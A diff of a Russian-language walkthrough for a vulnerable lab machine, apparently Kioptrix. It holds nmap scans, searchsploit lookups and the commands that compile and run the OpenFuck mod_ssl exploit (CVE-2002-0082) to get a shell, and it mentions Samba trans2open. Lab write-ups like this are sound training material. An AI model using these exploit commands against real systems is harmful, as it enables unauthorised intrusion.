@@ -19,15 +19,15 @@ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG all 192.168.246.132
 nmap -sVC -p22,80,111,139,443,32768 -oN target 192.168.246.132
 ```
 
-Используйте код с осторожностью.
+
 
 **Результаты:**
 
 - **Порт 22/tcp** — SSH — OpenSSH 2.9p2 (Очень старая версия, потенциальные эксплойты)
 - **Порт 80/tcp** — HTTP — Apache 1.3.20
 - **Порт 111/tcp** — rpcbind
-- **Порт 139/tcp** — netbios-ssn (Samba)
-- **Порт 443/tcp** — HTTPS — Apache 1.3.20 (mod_ssl/2.8.4) ⚠️ _Интересный вектор_
+- **Порт 139/tcp** — netbios-ssn (Samba) ⚠️ _Интересный вектор_1
+- **Порт 443/tcp** — HTTPS — Apache 1.3.20 (mod_ssl/2.8.4) ⚠️ _Интересный вектор_2
 
 
 Веб-разведка (Порты 80 / 443)
@@ -39,7 +39,7 @@ nmap -sVC -p22,80,111,139,443,32768 -oN target 192.168.246.132
     searchsploit mod_ssl 2.8.4
     ```
     
-    Используйте код с осторожностью.
+    
     
     - Результат: Найдена известная уязвимость **Apache mod_ssl < 2.8.5 - 'OpenFuckv2.c' Remote Buffer Overflow** (CVE-2002-0082).
 
@@ -60,7 +60,7 @@ smbclient -L //192.168.246.132/ -N
     searchsploit samba 2.2
     ```
     
-    Используйте код с осторожностью.
+  
     
     - Результат: Найдена уязвимость **Samba < 2.2.8 (Linux) - 'trans2open' Remote Overflow** (CVE-2003-0201).
 
@@ -78,7 +78,7 @@ _Поскольку эксплойты для этой машины сразу �
     
     ```bash
     gcc -o openfuck 47683.c -lssl -lcrypto
-	gcc -o OpenFuck1 OpenFuck.c -lcrypto -lssl -Wno-deprecated-declarations\n
+	# gcc -o OpenFuck1 OpenFuck.c -lcrypto -lssl -Wno-deprecated-declarations\n
 	./fuck | grep apache-1.3.20
 Запуск и получение обочки:
 	 ./OpenFuck1 0x6b 192.168.246.132 443 -c 40
@@ -132,7 +132,7 @@ _(Альтернативный способ прохождения для фик
     cat /var/spool/mail/root
     ```
     
-    Используйте код с осторожностью.
+   
     
     _Внутри находится приветственное письмо от автора лабы, подтверждающее успешное выполнение._
 
